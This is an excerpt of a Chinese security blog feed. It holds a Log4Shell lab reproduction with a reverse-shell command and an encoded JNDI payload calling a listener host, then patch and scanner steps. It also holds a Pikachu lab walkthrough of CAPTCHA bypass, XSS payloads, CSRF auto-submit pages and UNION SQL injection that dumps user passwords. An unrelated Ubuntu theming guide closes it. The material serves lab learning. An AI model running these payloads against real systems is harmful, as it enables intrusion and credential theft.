class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.43.241/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure></li></ol><ol start="3"><li><p>修改请求包并发送</p><p> 请求字段为<code>payload=${jndi:ldap://192.168.43.241:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA%252bJiAvZGV2L3RjcC8xOTIuMTY4LjQzLjI0MS83Nzc3IDA%252bJjE%253d}</code></p><p> 其中<code>YmFzaCAtaSA%252bJiAvZGV2L3RjcC8xOTIuMTY4LjQzLjI0MS83Nzc3IDA%252bJjE%253d</code>为<code>bash -i &gt;&amp; /dev/tcp/192.168.43.241/7777 0&gt;&amp;1</code>经过<code>base64</code>+两次<code>url</code>编码形成</p><p> <img src="/images/CVE-2021-44228/14.png" alt="14.png"></p></li><li><p>查看<code>JNDIExploit</code>工具流量</p><p> <img src="/images/CVE-2021-44228/15.png" alt="15.png"></p></li><li><p>查看<code>nc</code>监听</p><p> 已成功获取反弹<code>shell</code></p><p> <img src="/images/CVE-2021-44228/16.png" alt="16.png"></p></li></ol><hr><h1 id="火绒热补丁修复"><a href="#火绒热补丁修复" class="headerlink" title="火绒热补丁修复"></a>火绒热补丁修复</h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="验证漏洞存在"><a href="#验证漏洞存在" class="headerlink" title="验证漏洞存在"></a>验证漏洞存在</h3><p><img src="/images/CVE-2021-44228/17.png" alt="17.png"></p><p><img src="/images/CVE-2021-44228/18.png" alt="18.png"></p><h3 id="部署热补丁"><a href="#部署热补丁" class="headerlink" title="部署热补丁"></a>部署热补丁</h3><ol><li><p>确保存在漏洞主机配置好<code>java</code>环境变量</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.bash_profile</span><br></pre></td></tr></table></figure><p> 在文件末尾添加如下语句</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export JAVA_HOME=JDK的目录</span><br><span class="line">export JRE_HOME=JRE的目录</span><br><span class="line">export PATH=$JAVA_HOME/bin:$PATH</span><br><span class="line">export CLASSPATH=$JAVA_HOME/lib/tools.jar:$JAVA_HOME/lib/dt.jar</span><br></pre></td></tr></table></figure><p> <img src="/images/CVE-2021-44228/19.png" alt="19.png"></p><p> 使文件生效</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~/.bash_profile</span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li><p>火绒热补丁程序下载地址</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://bbs.huorong.cn/thread-96320-1-1.html</span><br></pre></td></tr></table></figure></li><li><p>将火绒补丁程序放置于存在漏洞主机中，解压</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip CVE-2021-44228-mitigator-Linux-v1.1.zip -d 1</span><br></pre></td></tr></table></figure><p> <img src="/images/CVE-2021-44228/20.png" alt="20.png"></p></li><li><p>进入解压目录，授于<code>.sh</code>文件执行权限</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd 1/</span><br><span class="line">chmod 744 CVE-2021-44228_mitigator.sh</span><br></pre></td></tr></table></figure><p> <img src="/images/CVE-2021-44228/21.png" alt="21.png"></p></li><li><p>执行</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./CVE-2021-44228_mitigator.sh</span><br></pre></td></tr></table></figure><p> <img src="/images/CVE-2021-44228/22.png" alt="22.png"></p><p> 出现上图说明存在漏洞，并自动安装了热补丁，无需重启</p><p> <strong>注意：热补丁在重启主机后失效，重启后需重新运行程序</strong></p></li></ol><h3 id="验证漏洞是否修复"><a href="#验证漏洞是否修复" class="headerlink" title="验证漏洞是否修复"></a>验证漏洞是否修复</h3><p><img src="/images/CVE-2021-44228/23.png" alt="23.png"></p><p>经过较长时间等待后，发现无任何返回值，漏洞已不存在</p><p><img src="/images/CVE-2021-44228/24.png" alt="24.png"></p><hr><h1 id="长亭牧云本地检查工具"><a href="#长亭牧云本地检查工具" class="headerlink" title="长亭牧云本地检查工具"></a>长亭牧云本地检查工具</h1><p><strong>注意：本工具基于本地<code>log4j2</code>组件所属<code>jar</code>包版本进行检查，若使用上面”火绒热补丁修复”方案，使用本工具仍可检查到存在漏洞</strong></p><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://log4j2-detector.chaitin.cn/</span><br></pre></td></tr></table></figure><p>根据不同类型主机选择不同版本下载即可</p><h2 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h2><ol><li><p>下载本地检查工具后，放置于需要检查的主机中，解压</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar xzvf log4j2_local_scanner_linux_amd64.v3.tar.gz</span><br></pre></td></tr></table></figure><p> <img src="/images/CVE-2021-44228/25.png" alt="25.png"></p></li><li><p>执行</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./log4j2_local_scanner_linux_amd64.v3    # 默认为全部jar文件，其他命令参数参考此工具官方网站</span><br></pre></td></tr></table></figure><p> <img src="/images/CVE-2021-44228/26.png" alt="26.png"></p><p> 程序会列出存在漏洞的<code>jar</code>包及其路径</p><p> 以上图为例：</p><ol><li><p><code>/root/demo/demo.jar</code>中包含<code>log4j-core-2.14.0.jar</code>，属于存在漏洞的版本。此<code>demo.jar</code>为本地测试靶机环境，并且已通过“火绒热补丁修复”方案进行修复（此工具仍可检查到）</p></li><li><p>其他检查结果项为<code>docker</code>中使用的<code>log4j-core-2.14.0.jar</code>组件，需按照<code>docker</code>官方给出的修复方案进行修复（类似的，若业务系统中使用了某些开源软件或商业软件，具体修复方法应遵循开源社区或官方出具的方案）</p></li></ol></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="Apache" scheme="http://yoursite.com/tags/Apache/"/>
    
  </entry>
  
  <entry>
    <title>pikachu</title>
    <link href="http://yoursite.com/2020/08/23/pikachu/"/>
    <id>http://yoursite.com/2020/08/23/pikachu/</id>
    <published>2020-08-23T11:10:00.000Z</published>
    <updated>2020-08-24T02:24:33.549Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><h2 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2><p><img src="/images/pikachu/1.png" alt="1.png"></p><h2 id="验证码绕过（on-server）"><a href="#验证码绕过（on-server）" class="headerlink" title="验证码绕过（on server）"></a>验证码绕过（on server）</h2><ol><li><p>抓包</p><p> <img src="/images/pikachu/2.png" alt="2.png"></p></li><li><p>修改账号密码，不修改验证码</p><p> <img src="/images/pikachu/3.png" alt="3.png"></p><p> 提示账号或密码错误，未提示验证码错误</p></li><li><p>修改验证码</p><p> <img src="/images/pikachu/4.png" alt="4.png"></p><p> 说明验证码无条件不刷新，无条件不刷新是指在某一时间段内，无论登录失败多少次，只要不刷新页面，就可以无限次的使用同一个验证码来对一个或多个用户帐号进行暴力猜解</p></li><li><p>对账号密码进行暴力破解</p><p> <img src="/images/pikachu/5.png" alt="5.png"></p></li></ol><h2 id="验证码绕过（on-client）"><a href="#验证码绕过（on-client）" class="headerlink" title="验证码绕过（on client）"></a>验证码绕过（on client）</h2><ol><li><p>尝试登录</p><p> <img src="/images/pikachu/6.png" alt="6.png"></p><p> 此时抓包无法获取请求包，说明验证码在客户端验证，验证成功之后才向服务器发起请求</p></li><li><p>抓包</p><p> 输入正确的验证码进行抓包</p><p> <img src="/images/pikachu/7.png" alt="7.png"></p><p> 虽然请求包中包含验证码字段，但并不在服务器进行验证，对账号密码进行暴力破解即可</p></li><li><p>暴力破解</p><p> <img src="/images/pikachu/8.png" alt="8.png"></p></li></ol><h2 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破"></a>token防爆破</h2><ol><li><p>抓包</p><p> 发现请求包中出现<code>token</code>字段</p><p> <img src="/images/pikachu/9.png" alt="9.png"></p></li><li><p>发起请求，查看响应包</p><p> <img src="/images/pikachu/10.png" alt="10.png"></p><p> 发现响应包中存在一个<code>token</code>字段，此<code>token</code>为下一次请求所使用的<code>token</code>值</p></li><li><p>将请求包中的<code>token</code>改为下一次所用的<code>token</code>值</p><p> 对其进行暴力破解</p><p> <img src="/images/pikachu/11.png" alt="11.png"></p></li><li><p>对密码的破解使用普通列表</p><p> <img src="/images/pikachu/12.png" alt="12.png"></p></li><li><p>对<code>token</code>的字典需从响应包中获取</p><ol><li><p>设置请求的线程数为1</p><p> <img src="/images/pikachu/13.png" alt="13.png"></p></li><li><p>设置<code>Grep-Extract</code>处</p><p> <img src="/images/pikachu/14.png" alt="14.png"></p></li><li><p>获取<code>token</code>值，并且复制当前响应包的<code>token</code>值</p><p> <img src="/images/pikachu/15.png" alt="15.png"></p></li><li><p>设置第二个字典，粘贴上一步复制的<code>token</code>值</p><p> <img src="/images/pikachu/16.png" alt="16.png"></p></li></ol></li><li><p>开始破解</p><p> <img src="/images/pikachu/17.png" alt="17.png"></p></li></ol><hr><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="反射型XSS（get）"><a href="#反射型XSS（get）" class="headerlink" title="反射型XSS（get）"></a>反射型XSS（get）</h2><ol><li><p>尝试输入代码</p><p> <img src="/images/pikachu/18.png" alt="18.png"></p><p> 发现输入框限制了输入字符限制</p></li><li><p>可通过修改<code>html</code>代码来去除限制</p><p> <img src="/images/pikachu/19.png" alt="19.png"></p><p> <img src="/images/pikachu/20.png" alt="20.png"></p></li><li><p>可直接修改<code>url</code>中的参数绕过限制</p><p> <img src="/images/pikachu/21.png" alt="21.png"></p><p> <img src="/images/pikachu/22.png" alt="22.png"></p></li></ol><h2 id="反射型XSS（post）"><a href="#反射型XSS（post）" class="headerlink" title="反射型XSS（post）"></a>反射型XSS（post）</h2><p>先进行登录，登录后可进行<code>XSS</code>攻击</p><p><img src="/images/pikachu/23.png" alt="23.png"></p><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p><img src="/images/pikachu/24.png" alt="24.png"></p><h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><ol><li><p>尝试进行攻击,失败</p><p> <img src="/images/pikachu/25.png" alt="25.png"></p><p> <img src="/images/pikachu/26.png" alt="26.png"></p></li><li><p>查看网页元素</p><p> <img src="/images/pikachu/27.png" alt="27.png"></p><p> 可发现注入语句被填充在<code>a</code>标签中，成为链接</p></li><li><p>根据规则进行标签的闭合，使用<code>a</code>标签的单击事件</p><p> <img src="/images/pikachu/28.png" alt="28.png"></p><p> <img src="/images/pikachu/29.png" alt="29.png"></p></li></ol><h2 id="DOM型XSS-x"><a href="#DOM型XSS-x" class="headerlink" title="DOM型XSS-x"></a>DOM型XSS-x</h2><ol><li><p>尝试攻击，出现两层链接</p><p> <img src="/images/pikachu/30.png" alt="30.png"></p></li><li><p>查看页面元素，同样被包含在标签中</p><p> <img src="/images/pikachu/31.png" alt="31.png"></p></li><li><p>将标签进行闭合，触发攻击，<code>&#39; onclick=&quot;alert(&#39;xss&#39;)&quot;&gt;</code></p><p> <img src="/images/pikachu/32.png" alt="32.png"></p><p> <img src="/images/pikachu/33.png" alt="33.png"></p></li></ol><h2 id="XSS盲打"><a href="#XSS盲打" class="headerlink" title="XSS盲打"></a>XSS盲打</h2><p>盲打只是一种惯称的说法，就是不知道后台有没有<code>xss</code>存在的情况下，不顾一切的输入<code>xss</code>代码在所有的输入框中，尽可能多的尝试<code>xss</code>语句。</p><p><code>xss</code>盲打是指在攻击者对数据提交后展现的结果未知的情况下，网站采用了攻击者插入了带真实攻击功能的<code>xss</code>攻击代码（通常是使用<code>script</code>标签引入远程的<code>js</code>）的数据。当后台在展现时没有对这些提交的数据进行过滤，那么后台管理人员在操作时就会触发<code>xss</code>来实现攻击者预定好的真实攻击功能</p><ol><li><p>在所有的输入框中输入<code>xss</code>代码</p><p> <img src="/images/pikachu/34.png" alt="34.png"></p></li><li><p>登录后台</p><p> <img src="/images/pikachu/35.png" alt="35.png"></p></li><li><p>触发攻击</p><p> <img src="/images/pikachu/36.png" alt="36.png"></p></li></ol><h2 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h2><ol><li><p>输入攻击语句</p><p> <img src="/images/pikachu/37.png" alt="37.png"></p><p> 发现注入语句被过滤</p></li><li><p>采用大小写方式进行绕过</p><p> <img src="/images/pikachu/38.png" alt="38.png"></p><p> <img src="/images/pikachu/39.png" alt="39.png"></p></li></ol><h2 id="XSS之htmlspecialchars"><a href="#XSS之htmlspecialchars" class="headerlink" title="XSS之htmlspecialchars"></a>XSS之htmlspecialchars</h2><p><code>PHP</code> <code>htmlspecialchars()</code>函数把预定义的字符转换为 HTML 实体</p><p><code>&amp;</code>（和）成为<code>&amp;amp;</code></p><p><code>&quot;</code>（双引号）成为<code>&amp;quot;</code></p><p><code>&#39;</code>（单引号）成为<code>&amp;#039;</code></p><p><code>&lt;</code>（小于）成为<code>&amp;lt;</code></p><p><code>&gt;</code>（大于）成为<code>&amp;gt;</code></p><ol><li><p>尝试输入特殊字符</p><p> <img src="/images/pikachu/40.png" alt="40.png"></p><p> 发现过滤了<code>&quot;</code>与<code>&gt;</code></p></li><li><p>可以在攻击语句中避免使用过滤字符，<code>&#39; onclick=&#39;alert(/xss/)&#39;</code></p><p> <img src="/images/pikachu/41.png" alt="41.png"></p></li></ol><h2 id="XSS之href输出"><a href="#XSS之href输出" class="headerlink" title="XSS之href输出"></a>XSS之href输出</h2><ol><li><p>输入攻击语句</p><p> <img src="/images/pikachu/42.png" alt="42.png"></p><p> 发现攻击语句被填充到<code>herf</code>属性中</p></li><li><p>可以使用<code>js</code>语句来进行执行，<code>javascript:alert(/xss/)</code></p><p> <img src="/images/pikachu/43.png" alt="43.png"></p></li></ol><h2 id="XSS之js输出"><a href="#XSS之js输出" class="headerlink" title="XSS之js输出"></a>XSS之js输出</h2><ol><li><p>尝试输入攻击语句，无任何返回</p></li><li><p>尝试输入任意语句，得到返回</p><p> <img src="/images/pikachu/44.png" alt="44.png"></p><p> 发现所输入的语句被放到代码中进行判断</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">$ms=&apos;1111&apos;;</span><br><span class="line">if($ms.length != 0)&#123;</span><br><span class="line">    if($ms == &apos;tmac&apos;)&#123;</span><br><span class="line">        $(&apos;#fromjs&apos;).text(&apos;tmac确实厉害,看那小眼神..&apos;)</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">       //alert($ms);</span><br><span class="line">        $(&apos;#fromjs&apos;).text(&apos;无论如何不要放弃心中所爱..&apos;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>根据规则进行代码闭合，<code>&#39;&lt;/script&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><p> <img src="/images/pikachu/45.png" alt="45.png"></p><p> <img src="/images/pikachu/46.png" alt="46.png"></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">$ms=&apos;&apos;&lt;/script&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&apos;;</span><br><span class="line">if($ms.length != 0)&#123;</span><br><span class="line">    if($ms == &apos;tmac&apos;)&#123;</span><br><span class="line">        $(&apos;#fromjs&apos;).text(&apos;tmac确实厉害,看那小眼神..&apos;)</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">       //alert(&apos;&lt;/script&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;);</span><br><span class="line">        $(&apos;#fromjs&apos;).text(&apos;无论如何不要放弃心中所爱..&apos;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ol><hr><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="CSRF（get）"><a href="#CSRF（get）" class="headerlink" title="CSRF（get）"></a>CSRF（get）</h2><ol><li><p>首先登录一个账号</p><p> <img src="/images/pikachu/47.png" alt="47.png"></p></li><li><p>修改个人信息，并抓包</p><p> 发现页面采取<code>get</code>的方式进行参数传递</p><p> <img src="/images/pikachu/48.png" alt="48.png"></p></li><li><p>构造恶意链接</p><p> <code>http://10.211.55.3/vul/csrf/csrfget/csrf_get_edit.php?sex=%E5%A5%B3&amp;phonenum=123123123&amp;add=qwe1&amp;email=123%40163.com&amp;submit=submit</code></p></li><li><p>在某一用户登录的情况下，诱使其访问恶意链接，可导致其遭受<code>CSRF</code>攻击</p><p> <img src="/images/pikachu/49.png" alt="49.png"></p></li><li><p>也可构造恶意页面，增强伪装</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   &lt;html&gt;</span><br><span class="line">   &lt;body&gt;</span><br><span class="line">   &lt;img src=&quot;http://10.211.55.3/vul/csrf/csrfget/csrf_get_edit.php?sex=%E5%A5%B3&amp;phonenum=123123123&amp;add=qwe1&amp;email=123%40163.com&amp;submit=submit&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;</span><br><span class="line">   &lt;h1&gt;error&lt;/h1&gt;</span><br><span class="line">       &lt;h2&gt;404&lt;/h2&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li><li><p>诱使登录用户进行访问</p><p> <img src="/images/pikachu/52.png" alt="52.png"></p><p> <img src="/images/pikachu/53.png" alt="53.png"></p></li></ol><h2 id="CSRF（post）"><a href="#CSRF（post）" class="headerlink" title="CSRF（post）"></a>CSRF（post）</h2><ol><li><p>登录用户，修改个人信息，抓包</p><p> 发现参数采用<code>post</code>的方式进行传递</p><p> <img src="/images/pikachu/50.png" alt="50.png"></p></li><li><p>构造恶意页面，发起恶意请求</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">   &lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;script&gt;</span><br><span class="line">       window.onload = function() &#123;</span><br><span class="line">       document.getElementById(&quot;postsubmit&quot;).click();</span><br><span class="line">   &#125;</span><br><span class="line">   &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">   &lt;form method=&quot;post&quot; action=&quot;http://10.211.55.3/vul/csrf/csrfpost/csrf_post_edit.php&quot;&gt;</span><br><span class="line">       &lt;input id=&quot;sex&quot; type=&quot;text&quot; name=&quot;sex&quot; value=&quot;body&quot; /&gt;</span><br><span class="line">       &lt;input id=&quot;phonenum&quot; type=&quot;text&quot; name=&quot;phonenum&quot; value=&quot;123456789&quot; /&gt;</span><br><span class="line">       &lt;input id=&quot;add&quot; type=&quot;text&quot; name=&quot;add&quot; value=&quot;usa&quot; /&gt;</span><br><span class="line">       &lt;input id=&quot;email&quot; type=&quot;text&quot; name=&quot;email&quot; value=&quot;vince@pikachu.com&quot; /&gt; </span><br><span class="line">       &lt;input id=&quot;postsubmit&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">   &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li><li><p>在某一用户登录的情况下，诱使其访问恶意页面，造成<code>CSRF</code>攻击</p><p> <img src="/images/pikachu/51.png" alt="51.png"></p></li></ol><h2 id="CSRF（token）"><a href="#CSRF（token）" class="headerlink" title="CSRF（token）"></a>CSRF（token）</h2><p>登录用户，修改个人信息，抓包,发现在请求中包含随机的<code>token</code>值</p><p><img src="/images/pikachu/54.png" alt="54.png"></p><p>无法利用</p><hr><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="数字型注入（post）"><a href="#数字型注入（post）" class="headerlink" title="数字型注入（post）"></a>数字型注入（post）</h2><ol><li><p>抓包</p><p> <img src="/images/pikachu/55.png" alt="55.png"></p></li><li><p>判断是否存在注入</p><ol><li><p>输入单引号</p><p> <img src="/images/pikachu/56.png" alt="56.png"></p></li><li><p>输入<code>1 and 1=1</code></p><p> <img src="/images/pikachu/57.png" alt="57.png"></p></li><li><p>输入<code>1 and 1=2</code></p><p> <img src="/images/pikachu/58.png" alt="58.png"></p></li></ol></li><li><p>判断查询语句的字段数</p><p> <img src="/images/pikachu/59.png" alt="59.png"></p><p> <img src="/images/pikachu/60.png" alt="60.png"></p><p> <img src="/images/pikachu/61.png" alt="61.png"></p><p> 说明只有两个字段</p></li><li><p>获取数据库名</p><p> <img src="/images/pikachu/62.png" alt="62.png"></p></li><li><p>获取表名</p><p> <code>information_schema</code>数据库是<code>MySQL</code>自带的，它提供了访问数据库元数据的方式</p><p> 其中保存着关于<code>MySQL</code>服务器所维护的所有其他数据库的信息。如：数据库名，数据库的表，列的数据类型与访问权限等</p><p> <code>information_schema</code>数据库的<code>table</code>表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个数据库，表类型，表引擎，创建时间等信息</p><p> <code>1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;pikachu&#39;</code></p><p> <img src="/images/pikachu/63.png" alt="63.png"></p></li><li><p>获取数据库中<code>users</code>表中的列</p><p> <code>information_schema</code>数据库的<code>columns</code>表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息</p><p> <code>1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;</code></p><p> <img src="/images/pikachu/64.png" alt="64.png"></p></li><li><p>获取数据记录</p><p> <code>1 union select group_concat(id,username),group_concat(password) from users</code></p><p> <img src="/images/pikachu/65.png" alt="65.png"></p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
      <category term="pikachu" scheme="http://yoursite.com/tags/pikachu/"/>
    
  </entry>
  
  <entry>
    <title>Linux桌面美化</title>
    <link href="http://yoursite.com/2019/06/17/Linux%E6%A1%8C%E9%9D%A2%E7%BE%8E%E5%8C%96/"/>
    <id>http://yoursite.com/2019/06/17/Linux桌面美化/</id>
    <published>2019-06-17T02:33:00.000Z</published>
    <updated>2020-02-04T09:34:17.730Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="系统安装"><a href="#系统安装" class="headerlink" title="系统安装"></a>系统安装</h1><p><code>Ubuntu 18.04.2 LTS</code></p><hr><h1 id="操作系统初始配置"><a href="#操作系统初始配置" class="headerlink" title="操作系统初始配置"></a>操作系统初始配置</h1><ol><li><p>打开“软件和更新”</p></li><li><p>更改<code>Ubuntu</code>软件更新源，使系统自动选择当前网络下最好的更新服务器</p><p> <img src="/images/Linuxmeihua/1.png" alt="1.png"></p><p> <img src="/images/Linuxmeihua/2.png" alt="2.png"></p><p> <img src="/images/Linuxmeihua/3.png" alt="3.png"></p><p> <img src="/images/Linuxmeihua/4.png" alt="4.png"></p></li><li><p>登陆<code>Ubuntu</code>云端账号</p><p> <img src="/images/Linuxmeihua/5.png" alt="5.png"></p><p> 当登陆<code>Ubuntu</code>云端账号后，勾选<code>Canonical Livepatch</code></p><p> <img src="/images/Linuxmeihua/6.png" alt="6.png"></p><p> 用于：当官方发布需进行重启的安装补丁时，<code>Livepatch</code>可保证不中断当前工作、不重启的情况下安装补丁</p></li><li><p>安装英伟达显卡驱动</p><p> <img src="/images/Linuxmeihua/7.png" alt="7.png"></p></li><li><p>保存更改后的配置</p><p> <img src="/images/Linuxmeihua/8.png" alt="8.png"></p></li></ol><hr><h1 id="操作系统美化"><a href="#操作系统美化" class="headerlink" title="操作系统美化"></a>操作系统美化</h1><ol><li><p>查看当前<code>Gnome</code>桌面的版本</p><p> <img src="/images/Linuxmeihua/9.png" alt="9.png"></p></li><li><p>更新软件源</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure><p> <img src="/images/Linuxmeihua/10.png" alt="10.png"></p></li><li><p>安装优化(<code>gnome-tweaks</code>)</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gnome-tweaks</span><br></pre></td></tr></table></figure><p> <img src="/images/Linuxmeihua/11.png" alt="11.png"></p></li><li><p>安装<code>chrome-gnome-shell</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install chrome-gnome-shell</span><br></pre></td></tr></table></figure><p> <img src="/images/Linuxmeihua/12.png" alt="12.png">  </p></li><li><p>浏览器访问</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://extensions.gnome.org</span><br></pre></td></tr></table></figure></li><li><p>安装浏览器扩展</p><p> <img src="/images/Linuxmeihua/13.png" alt="13.png"> </p><p> 安装失败</p><p> <img src="/images/Linuxmeihua/14.png" alt="14.png"> </p><p> 解决方法：</p><ol><li><p>浏览器访问<code>about:config</code></p></li><li><p>找到<code>xpinstall.signatures.required</code>，修改值为<code>false</code></p><p><img src="/images/Linuxmeihua/15.png" alt="15.png"> </p></li></ol></li></ol><h2 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h2><ol><li><p>安装浏览器扩展<code>User Themes</code></p><p> <img src="/images/Linuxmeihua/16.png" alt="16.png"></p></li><li><p>访问<code>https://www.gnome-look.org</code> </p><p> <img src="/images/Linuxmeihua/17.png" alt="17.png"></p></li><li><p>搜索<code>McMojave</code>，下载</p><p> <img src="/images/Linuxmeihua/18.png" alt="18.png"></p></li><li><p>将<code>McMojave-light.tar.xz</code>    解压后剪切至当前用户家目录下的<code>.themes/</code>(需新建)目录中</p></li><li><p>设置<code>tweaks</code></p><p> 修改应用主题为<code>Mojave-light</code></p><p> <img src="/images/Linuxmeihua/19.png" alt="19.png"></p></li><li><p>则系统主题已被修改</p><p> <img src="/images/Linuxmeihua/20.png" alt="20.png"></p></li></ol><h2 id="图标"><a href="#图标" class="headerlink" title="图标"></a>图标</h2><ol><li><p>访问<code>https://www.gnome-look.org</code>，搜索<code>cupertino icons</code>，下载</p><p>  <img src="/images/Linuxmeihua/21.png" alt="21.png"></p></li><li><p>将<code>Cupertino.tar.xz</code>解压后剪切至当前用户家目录下的<code>.icons/</code>(需新建)目录中</p></li><li><p>设置<code>tweaks</code></p><p> 修改图标为<code>Cupertino</code></p><p> <img src="/images/Linuxmeihua/22.png" alt="22.png"></p></li><li><p>则图标样式已被修改</p><p> <img src="/images/Linuxmeihua/23.png" alt="23.png"></p></li></ol><h2 id="鼠标指针"><a href="#鼠标指针" class="headerlink" title="鼠标指针"></a>鼠标指针</h2><ol><li><p>访问<code>https://www.gnome-look.org</code>，搜索<code>OSX EI Capitan</code>，下载</p><p> <img src="/images/Linuxmeihua/24.png" alt="24.png"></p></li><li><p>将<code>175749-OSX-ElCap.tar.bz2</code>解压后的目录下的<code>OSX-ElCap</code>剪切至当前用户家目录下的<code>.icons/</code>目录中，进入此目录，执行</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./install.sh</span><br></pre></td></tr></table></figure><p> <img src="/images/Linuxmeihua/25.png" alt="25.png"></p><p> 选择3，安装鼠标主题</p></li><li><p>设置<code>tweaks</code></p><p> 